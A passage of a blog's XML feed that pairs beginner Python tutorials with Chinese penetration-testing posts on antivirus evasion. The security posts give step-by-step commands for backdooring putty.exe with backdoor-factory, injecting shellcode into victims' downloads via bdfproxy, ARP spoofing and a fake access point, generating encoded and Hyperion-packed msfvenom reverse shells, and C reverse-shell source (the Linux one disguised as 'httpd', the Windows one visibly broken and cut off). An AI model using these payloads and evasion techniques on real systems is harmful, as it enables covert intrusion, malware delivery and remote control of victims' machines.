class="number">-1</span>]</span><br><span class="line"><span class="string">'LKJHGFEDCB'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[:<span class="number">-100</span>:<span class="number">-1</span>]</span><br><span class="line"><span class="string">'LKJHGFEDCBA'</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 索引 </tag>
            
            <tag> 切片 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python内建的数值型函数及基本输入输出</title>
      <link href="/2018/02/08/Python/Python_Basic/Python%E5%86%85%E5%BB%BA%E7%9A%84%E6%95%B0%E5%80%BC%E5%9E%8B%E5%87%BD%E6%95%B0%E5%8F%8A%E5%9F%BA%E6%9C%AC%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/"/>
      <url>/2018/02/08/Python/Python_Basic/Python%E5%86%85%E5%BB%BA%E7%9A%84%E6%95%B0%E5%80%BC%E5%9E%8B%E5%87%BD%E6%95%B0%E5%8F%8A%E5%9F%BA%E6%9C%AC%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<p><strong>预置(内建)的数值型函数</strong></p><pre><code>abs(x)        #取x的绝对值round(number,ndigits)        #对数值进行四舍五入,ndigits是小数向右取整数的位数,负数表示向左取整round(112.34567,3)pow(x,y,z=None)        #相当于 x**y 或 x**y%zhelp()        #查看函数的帮助help(函数名)例:    help(abs)    #查看abs函数的帮助文档</code></pre><p><strong>语句(statements)</strong></p><ul><li>语句是python执行的最小单位,语句可以独立执行</li></ul><p>语句实例:</p><pre><code>a=100    #赋值语句del a     #del语句print(&quot;hello&quot;)    #表达式语句1+2+3            #表达式语句</code></pre><p>说明:</p><ul><li>多条语句写在一行内需要用分号(；)分开</li><li>通常一条语句写在一行内(复合语句除外)</li></ul><p><strong>折行符 \ (反斜杠)</strong></p><ul><li>折行符是告诉解释执行器,下一行的内容也是此语句的内容</li></ul><p><strong>隐式换行</strong></p><ul><li>所有的括号的内容换行时,解释执行器会自动去下一行找到相对应的括号,直到找到为止,称为隐式换行</li></ul><p><strong>基本输入输出函数</strong></p><p>输入函数: <code>input()</code><br>作用:从标准输入设备上读取一个字符串(注:末尾的换行字符会被删除)<br>格式: <code>input(&#39;提示字符串&#39;)</code><br>注:返回一个字符串,提示字符串可以为空</p><p>输出函数: <code>print</code><br>作用:将一系列的值以字符的形式输出到标准设备上,默认为终端<br>格式: <code>print(value,...,sep=&#39;&#39;,end=&#39;\n&#39;)</code><br>关键字参数说明:<br>sep: 两个值之间的分隔符,默认为一个字格’’<br>end: 输出完毕后在流末尾自动追加一个字符串,默认为换行符 <code>&#39;\n&#39;</code></p><h4 id="练习"><a href="#练习" class="headerlink" title="练习"></a><strong>练习</strong></h4><ol><li>假设1年只有365天,输入年数,打印这些年有多少个周</li></ol><ul><li>新建 <code>years.py</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s=input(<span class="string">"请输入年数:"</span>)</span><br><span class="line">years=int(s)</span><br><span class="line"></span><br><span class="line">weeks=years * <span class="number">365</span> // <span class="number">7</span></span><br><span class="line">days=years * <span class="number">365</span> % <span class="number">7</span></span><br><span class="line">print(<span class="string">"共有"</span>,weeks,<span class="string">"个周,余"</span>,days,<span class="string">"天."</span>)</span><br></pre></td></tr></table></figure><ol start="2"><li>分三次输入当前的小时,分钟,秒数,在终端打印此时间距离0:0:0过了多少秒?</li></ol><ul><li>新建 <code>seconds.py</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s=input(<span class="string">"请输入小时:"</span>)</span><br><span class="line">hours=int(s)</span><br><span class="line">s=input(<span class="string">"请输入分钟:"</span>)</span><br><span class="line">minutes=int(s)</span><br><span class="line"></span><br><span class="line">s=input(<span class="string">"请输入秒:"</span>)</span><br><span class="line">second=int(s)</span><br><span class="line">print(<span class="string">"总秒数:"</span>,hours * <span class="number">3600</span> + minutes * <span class="number">60</span> + second)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python语言的优缺点</title>
      <link href="/2018/02/07/Python/python%E8%AF%AD%E8%A8%80%E7%9A%84%E4%BC%98%E7%BC%BA%E7%82%B9/"/>
      <url>/2018/02/07/Python/python%E8%AF%AD%E8%A8%80%E7%9A%84%E4%BC%98%E7%BC%BA%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h4 id="Python的诞生"><a href="#Python的诞生" class="headerlink" title="Python的诞生"></a><strong>Python的诞生</strong></h4><ul><li>创建人: Guido van Rossum    (荷兰人)</li><li>时间: 1989年圣诞节期间</li></ul><h4 id="计算机语言发展"><a href="#计算机语言发展" class="headerlink" title="计算机语言发展"></a><strong>计算机语言发展</strong></h4><ol><li>二进制机器指令<br> 01 01 10</li><li>汇编语言<br> ADD R0 R1<br> ST    R2</li><li>编译(compile)型语言<br> C / C++ / Go /PASCAL<br> 先翻译成汇编语言,再翻译成二进制指令</li><li>解释执行语言<br> Python / Java / Php / Basic / C#</li></ol><h4 id="Python应用领域"><a href="#Python应用领域" class="headerlink" title="Python应用领域"></a><strong>Python应用领域</strong></h4><ul><li>系统自动化运维</li><li>网络编程(搜索引擎,爬虫,服务器编程等)</li><li>科学计算</li><li>人工智能,机器人</li><li>Web开发</li><li>云计算</li><li>大数据及数据库编程</li><li>教育</li><li>游戏</li></ul><p><strong>Python的优点</strong></p><ul><li>纯面向对象(Java,C++,Python,C#,Swift)</li><li>免费</li><li>可移植</li><li>可混合编程(C/C++/Java/.net)</li><li>简单易学易用</li><li>开发效率高</li><li>应用领域广泛</li><li>开源</li><li>自动化内存管理和引用计数</li></ul><p><strong>Python的缺点</strong></p><ul><li>与C/C++相比,执行速度不够快</li><li>不能封闭源代码</li><li>不能写操作系统内核和驱动程序</li></ul><p><strong>Python的解释执行器类型</strong></p><ul><li>CPython        (C语言开发,官网下载默认)</li><li>Jython        (Java语言开发)</li><li>IronPython    (.net开发)</li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Backdoor-factory后门工厂免杀工具及bdfproxy</title>
      <link href="/2016/08/08/Avoid_Killing/Backdoor-factory%E5%90%8E%E9%97%A8%E5%B7%A5%E5%8E%82%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7/"/>
      <url>/2016/08/08/Avoid_Killing/Backdoor-factory%E5%90%8E%E9%97%A8%E5%B7%A5%E5%8E%82%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="Backdoor-Factory"><a href="#Backdoor-Factory" class="headerlink" title="Backdoor-Factory"></a><strong>Backdoor-Factory</strong></h3></blockquote><p><strong>Patch</strong></p><ul><li>通过替换EXE,DLL,注册表等方法修复系统漏洞或问题的方法</li><li>BdF:向二进制文件中增加或者删除代码内容<br>  某些受保护的二进制程序无法patch<br>  存在一定概率文件会被patch坏掉</li></ul><p><strong>后门工厂</strong></p><ul><li><p>适用于windows PE x32/x64 和 Linux ELF x32/x64 (OSX)</p></li><li><p>支持MSF payload,自定义payload</p></li><li><p>将shellcode代码patch进模板文件,躲避AV检查</p></li><li><p>Python语言编写</p></li></ul><p><strong>MsF使用的patch方法</strong></p><ul><li><p>覆盖程序入口</p><p>  <code>msfvenom -p windows/shell/reverse_tcp...</code></p></li><li><p>创建新的线程执行shellcode并跳回原程序入口</p><p>  <code>msfvenom -p windows/shell/reverse_tcp -k</code><br>  增加代码片段跳转执行后跳回源程序入口</p></li></ul><p><strong>CTP 方法</strong></p><ul><li>增加新的代码段 section, 与MSF的 <code>-k</code> 方法类似</li><li>使用现有的代码裂缝/洞(code cave)存放 shellcode</li></ul><p><strong>代码洞</strong></p><ul><li>二进制文件中超过两个字节的连续 <code>x00</code> 区域(代码片段间区域)</li><li>根据统计判断代码洞是编译器在进行编译时造成的,不同的编译器造成的代码洞的大小不同</li></ul><pre><code>cp `which cat` .lshexeditor cat</code></pre><ul><li>单个代码洞大小不足以存放完整的shellcode<br>多代码洞跳转(非顺序执行)<br>初期免杀率可达100%<br>结合MsF的stager方法</li></ul><p><strong>Patch选项</strong></p><ul><li>附加代码段</li><li>单代码洞注入</li><li>多代码洞注入</li></ul><h4 id="BdF基本使用"><a href="#BdF基本使用" class="headerlink" title="BdF基本使用"></a><strong>BdF基本使用</strong></h4><p><strong>检查二进制文件是否支持代码注入</strong></p><pre><code>backdoor-factory -f putty.exe –S</code></pre><p><strong>显示可用payload</strong></p><pre><code>backdoor-factory -f putty.exe -s showiat_reverse_tcp_stager_threaded</code></pre><p><strong>查看code cave大小</strong></p><pre><code>backdoor-factory -f putty.exe -c -l 100        #查看100字节的cave大小有多少</code></pre><ul><li>IAT—-import address table<br>指针指向WinAPI地址,被称为thunks(形实转换程序),地址预定义    </li></ul><h5 id="免杀效果对比"><a href="#免杀效果对比" class="headerlink" title="免杀效果对比"></a><strong>免杀效果对比</strong></h5><pre><code>backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666        #单代码洞注入backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666 –J        #多代码洞注入backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -a -H 192.168.20.8 -P 6666 -a     #新加一个代码片段注入</code></pre><p><strong>与 veil-evasion 集成</strong></p><ul><li>最新版veil默认已经没有backdoor-factory模块.</li></ul><h4 id="BdFproxy"><a href="#BdFproxy" class="headerlink" title="BdFproxy"></a><strong>BdFproxy</strong></h4><p><strong>BdFproxy</strong> (mitmproxy)</p><ul><li>基于流量劫持动态注入shellcode(ARP spoof, DNS spoof, Fake AP)</li></ul><p><strong>步骤</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.ip_forward&#x3D;1#打开路由IP转发功能</span><br><span class="line"></span><br><span class="line">#添加防火墙规则,把访问目标80&#x2F;443端口的流量重定向到8080</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80&#x2F;443 -j REDIRECT --toports 8080</span><br><span class="line"></span><br><span class="line">vi &#x2F;etc&#x2F;bdfproxy&#x2F;bdfproxy.cfg</span><br><span class="line">proxyMode &#x3D; transparent#默认代理模式regular,修改为transparent透明代理</span><br><span class="line">修改侦听IP地址并启动bdfproxy#&#x2F;16</span><br><span class="line"></span><br><span class="line">arpspoof -i eth0 -t 1.1.1.2 1.1.1.1#执行ARP欺骗一个目标</span><br></pre></td></tr></table></figure><ul><li><p>启动MsF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfdb init#初始化msf数据库</span><br><span class="line">msfconsole -r &#x2F;usr&#x2F;share&#x2F;bdfproxy&#x2F;bdfproxy_msf_rescurce.rc</span><br></pre></td></tr></table></figure></li><li><p>Mana 创建 Fack AP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">apt-get install mana</span><br><span class="line">vi &#x2F;etc&#x2F;mana-toolkit&#x2F;hostapd-mana.conf</span><br><span class="line">#修改无线SSID名称</span><br><span class="line"></span><br><span class="line">.&#x2F;usr&#x2F;share&#x2F;mana-toolkit&#x2F;run-mana&#x2F;start-nat-simple.sh</span><br><span class="line">修改wlan0无线网卡适配器并启动</span><br><span class="line">iptables -t nat -A PREROUTING -i $phy -p tcp --dport 80&#x2F;443 -j REDIRECT --to-port 8080</span><br><span class="line">sysctl -w net.ipv4.ip_forward&#x3D;1</span><br></pre></td></tr></table></figure></li><li><p>BdFproxy 代理注入代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;bdfproxy&#x2F;bdfproxy.cfg</span><br><span class="line">proxyMode &#x3D; transparent</span><br><span class="line">修改侦听IP地址并启动bdfproxy#&#x2F;16</span><br><span class="line"></span><br><span class="line">bdfproxy</span><br></pre></td></tr></table></figure></li><li><p>MsF侦听反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -r &#x2F;usr&#x2F;share&#x2F;bdfproxy&#x2F;bdfproxy_msf_resource.rc</span><br></pre></td></tr></table></figure></li></ul><p><strong>补充内容</strong></p><ul><li>全站HTTPS防注入(微软每个补丁都带马)</li><li>PE文件证书签名可被清除</li><li>PE Header -&gt; Optional Header -&gt; Certificate Table(Address and size)<br>  全部用 0 覆盖<br>  BDF默认清除数字签名</li><li><code>https://live.sysinternals.com</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
            <tag> MSF </tag>
            
            <tag> msfvenom </tag>
            
            <tag> payload </tag>
            
            <tag> python </tag>
            
            <tag> backdoor-factory </tag>
            
            <tag> bdfproxy </tag>
            
            <tag> arpspoof </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Veil-catapult注入进程内存执行及shellter免杀</title>
      <link href="/2016/08/06/Avoid_Killing/Veil-catapult%E6%B3%A8%E5%85%A5%E8%BF%9B%E7%A8%8B%E5%86%85%E5%AD%98%E6%89%A7%E8%A1%8C%E5%8F%8Ashellter%E5%85%8D%E6%9D%80/"/>
      <url>/2016/08/06/Avoid_Killing/Veil-catapult%E6%B3%A8%E5%85%A5%E8%BF%9B%E7%A8%8B%E5%86%85%E5%AD%98%E6%89%A7%E8%A1%8C%E5%8F%8Ashellter%E5%85%8D%E6%9D%80/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="Veil-catapult"><a href="#Veil-catapult" class="headerlink" title="Veil-catapult"></a><strong>Veil-catapult</strong></h3></blockquote><ul><li>也属于 Veil-Framework框架的一部分</li></ul><p><strong>Payload的投递</strong></p><ul><li>集成veil-evasion生成免杀payload或自定义payload</li><li>使用 impacket 上传二进制 payload 文件</li><li>使用 <code>passing-the-hash</code> 触发执行 payload</li></ul><p><strong>Payload直接在内存中运行</strong></p><ul><li>payload不写入硬盘，避免文件型病毒查杀</li></ul><p><strong>Powershell Injector</strong></p><ul><li>适用于windows7及以上系统版本</li></ul><pre><code>veil-catapult         #启动veil-catapult#根据提示进行参数设置#先传了个powershell#然后传了个msf的payload#再用shell调用payload#最后反弹shell</code></pre><p><strong>Barebones Python Injector</strong></p><ul><li>适用于powershell injector 失败的情况下使用</li></ul><p><strong>Sethc backdoor</strong></p><ul><li>用 cmd.exe 替换 C:\Windows\System32\sethc.exe</li></ul><p><strong>Execute custom command</strong></p><ul><li>执行自定义命令</li></ul><p><strong>EXE delivery</strong></p><pre><code>/etc/veil/settings.py</code></pre><h4 id="另一种免杀思路"><a href="#另一种免杀思路" class="headerlink" title="另一种免杀思路"></a><strong>另一种免杀思路</strong></h4><p><strong>传统防病毒查杀原理</strong></p><ul><li>查找文件体特殊字符串,匹配则查杀</li><li>找到触发AV查杀的精确字符串,并将其修改</li></ul><ul><li>将执行程序分片成很多小片段</li><li>将包含MZ头的第一个片段与后续片段依次组合后交给AV查杀</li><li>重复以上步骤,最终精确定位</li></ul><p><strong>二进制文件切片工具</strong> </p><p><code>Evade</code> , <code>Dsplit</code></p><p><strong>16进制文件编辑工具</strong></p><p><code>Hexeditor</code>    , <code>ghex</code>    #ghex是图形化界面</p><pre><code>apt-get install ghex        #kali安装ghex</code></pre><h4 id="shellter"><a href="#shellter" class="headerlink" title="shellter"></a><strong>shellter</strong></h4><ul><li>代码混淆</li><li>定制的编码方式</li><li>多态编码</li><li>集成部分 MSF payload</li><li>目前只支持32位PE程序</li><li>使用正常的EXE文件作为模板,将payload代码加入到模板内<br>模板程序的功能将失效</li></ul><p><strong>kali安装shellter</strong></p><pre><code>apt-get install shellter    #安装使用shellter                    #按照提示使用</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
            <tag> msfvenom </tag>
            
            <tag> Veil-Framework </tag>
            
            <tag> payload </tag>
            
            <tag> python </tag>
            
            <tag> passing-the-hash </tag>
            
            <tag> shellter </tag>
            
            <tag> ghex </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Veil-evasion自动生成免杀后门</title>
      <link href="/2016/08/05/Avoid_Killing/Veil-evasion%E8%87%AA%E5%8A%A8%E7%94%9F%E6%88%90%E5%85%8D%E6%9D%80%E5%90%8E%E9%97%A8/"/>
      <url>/2016/08/05/Avoid_Killing/Veil-evasion%E8%87%AA%E5%8A%A8%E7%94%9F%E6%88%90%E5%85%8D%E6%9D%80%E5%90%8E%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="Veil-evasion"><a href="#Veil-evasion" class="headerlink" title="Veil-evasion"></a><strong>Veil-evasion</strong></h3></blockquote><ul><li><p>属于 Veil-Framework框架的一部分</p></li><li><p>由 Python 语言编写</p></li><li><p>用于自动生成免杀 payload</p></li><li><p>集成msf payload,支持自定义payload</p></li><li><p>集成各种注入技术</p></li><li><p>集成各种第三方工具</p><p>   <code>Hypersion</code> , <code>PEScrambler</code> , <code>BackDoor Factory</code></p></li><li><p>集成各种开发打包运行环境</p><p>   Python: pyinstaller / py2exe<br>   C#: mono for .NET<br>   C: mingw32<br>   ruby</p></li></ul><p><strong>kali安装使用Veil-evasion</strong></p><pre><code>apt-get install veil-evasionveil        #首次运行安装环境use 1        #使用 Evasionlist        #列出shellcode编号,最新3.1版本默认41个payloaduse 35        #选择使用35号python注入型shellcodeoptions        #查看payload选项set            #可以使用set对payload进行配置generate    #确认配置后生成payload</code></pre><h4 id="MSF利用payload"><a href="#MSF利用payload" class="headerlink" title="MSF利用payload"></a><strong>MSF利用payload</strong></h4><ul><li>使用Veil-evasion生成payload后会在本地路径 <code>/var/lib/veil/output/handlers</code> 下保存MSF的处理程序</li></ul><p><strong>使用MSF侦听连接</strong></p><pre><code>msfconsole -r cat35_handler.rc        #MSF使用Veil生成的配置文件jobssessions                    #运行木马后,查看连接会话sessions -i 1                #进入会话ID,获取交互shell</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
            <tag> MSF </tag>
            
            <tag> msfvenom </tag>
            
            <tag> Veil-Framework </tag>
            
            <tag> Hyperion </tag>
            
            <tag> payload </tag>
            
            <tag> python </tag>
            
            <tag> Veil-evasion </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>msfvenom后门生成及Hyperion加密</title>
      <link href="/2016/08/04/Avoid_Killing/msfvenom%E5%90%8E%E9%97%A8%E7%94%9F%E6%88%90%E5%8F%8AHyperion%E5%8A%A0%E5%AF%86/"/>
      <url>/2016/08/04/Avoid_Killing/msfvenom%E5%90%8E%E9%97%A8%E7%94%9F%E6%88%90%E5%8F%8AHyperion%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<h4 id="生成反弹shell"><a href="#生成反弹shell" class="headerlink" title="生成反弹shell"></a><strong>生成反弹shell</strong></h4><pre><code>msfvenom -p windows/shell/bind_tcp lhost=1.1.1.1 lport=4444 -a x86 --platform win -f exe -o a.exe</code></pre><p><strong>生成加密编码反弹shell</strong></p><pre><code>msfvenom -p windows/shell/bind_tcp lhost=1.1.1.1 lport=4444 -f raw -e x86/shikata_ga_nai -i 5 | msfvenom -a x86 --platform windows -e x86/ countdown -i 8  -f raw | msfvenom -a x86 --platform windows -e x86/ shikata_ga_nai -i 9 -b &apos;\x00&apos; -f exe -o a.exe</code></pre><ul><li>比较编码前后的检测率</li></ul><p><strong>查看文件md5值</strong></p><pre><code>md5sum *.exe</code></pre><p><strong>可读字符串查看</strong> 比较</p><pre><code>strings a.exestrings b.exe</code></pre><h4 id="利用模板隐藏shell"><a href="#利用模板隐藏shell" class="headerlink" title="利用模板隐藏shell"></a><strong>利用模板隐藏shell</strong></h4><pre><code>msfvenom -p windows/shell_reverse_tcp -x /usr/share/windows-binaries/plink.exe lhost=1.1.1.1 lport=4444 -a x86 --platform win -f exe -o a.exe#利用模板和加密生成msfvenom -p windows/shell/bind_tcp -x /usr/share/windows-binaries/plink.exe lhost=1.1.1.1 lport=4444 -e x86/shikata_ga_nai -i 5 -a x86 --platform win -f exe &gt; b.exe</code></pre><blockquote><h4 id="软件保护"><a href="#软件保护" class="headerlink" title="软件保护"></a><strong>软件保护</strong></h4></blockquote><ul><li>软件开发商为保护版权,采用的混淆和加密技术避免盗版逆向</li><li>常被恶意软件用于免杀目的</li></ul><p><strong>Hyperion</strong> (32bit PE程序加密器)</p><ul><li>Crypter / Container    # 解密器 / PE Loader</li></ul><pre><code>#克隆github源码git clone https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-1.2.zipunzip Hyperion-1.2.zip#加上静态库文件进行编译cd Hyperion-1.2 &amp;&amp; i686-w64-mingw32-g++ -static-libgcc -static-libstdc++ Src/Crypter/*.cpp -o h.exe#安装wine32运行环境dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32#生成后门msfvenom -p windows/shell/reverse_tcp lhost=192.168.1.15 lport=4444 --platform win -e x86/shikata_ga_nai -a x86 -f exe -o a.exe#使用Hyperion后门加壳wine h.exe a.exe b.exe</code></pre><p><strong>Windows reverse shell</strong></p><pre><code>wine gcc.exe windows.c -o windows.exe -lws2_32</code></pre><p><strong>Linux shell</strong></p><pre><code>gcc linux_revers_shell.c -o linux</code></pre><p><strong>linux_revers_shell.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sock</span>;</span></span><br><span class="line"><span class="keyword">int</span> s;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"uso: &lt;rhost&gt; &lt;rport&gt;\n"</span>); <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">sock.sin_family  = AF_INET;</span><br><span class="line">sock.sin_port = htons(atoi(argv[<span class="number">2</span>]));</span><br><span class="line">sock.sin_addr.s_addr = inet_addr(argv[<span class="number">1</span>]);</span><br><span class="line">s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">connect</span>(s,(struct sockaddr_in *)&amp;sock, <span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line"></span><br><span class="line">dup2(s,<span class="number">0</span>);</span><br><span class="line">dup2(s,<span class="number">1</span>);</span><br><span class="line">dup2(s,<span class="number">2</span>);</span><br><span class="line">execl(<span class="string">"/bin/sh"</span>,<span class="string">"httpd"</span>,(<span class="keyword">char</span> *)<span class="number">0</span>); <span class="comment">//precess httpd</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>windows.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># 未修正错误</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"ws2_32"</span>)</span></span><br><span class="line"></span><br><span class="line">WSADATA wsaData;</span><br><span class="line">SOCKET Winsock;</span><br><span class="line">SOOKET Sock;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">hax</span>;</span></span><br><span class="line"><span class="keyword">char</span> ip_addr[<span class="number">16</span>];</span><br><span class="line">STARTUPINFO ini_processo;</span><br><span class="line">PROCESS_INFORMATION processo_info;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"><span class="title">WSAStartup</span><span class="params">(MAKEWORD(<span class="number">2</span>,<span class="number">2</span>), wsaData)</span></span>;</span><br><span class="line">winsock=WSASoket(AF_INET,SOCK_STREAM,IPPROTO_TCP,<span class="literal">NULL</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="literal">NULL</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">3</span>) </span><br><span class="line">&#123;<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Uso: &lt;rhost&gt; &lt;rport&gt;\n"</span>;) <span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">host</span>;</span></span><br><span class="line">host = gethostbyname(argv [<span class="number">1</span>] );</span><br><span class="line"><span class="built_in">strcpy</span>(ip_addr,inet_ntoa(*((struct in_addr *)host-&gt;h_addr)));</span><br><span class="line"></span><br><span class="line">hax.sin_family = AF_INET;</span><br><span class="line">hax.sin_port = htons(atoi(argv[<span class="number">2</span>]));</span><br><span class="line">hax.sin_addr.s_addr = inet_addr(ip_addr);</span><br><span class="line"></span><br><span class="line">WSAConnect(Winsock,(SOCKADDR* &amp;hax,<span class="keyword">sizeof</span>(hax),<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">memset</span>(&amp;ini_processo,<span class="number">0</span>,<span class="keyword">sizeof</span>(ini_processo));</span><br><span class="line">ini_processo.cb = <span class="keyword">sizeof</span>(ini_processo);</span><br><span class="line">ini_processo.dwFlags = START_USESTDHANDLES;</span><br><span 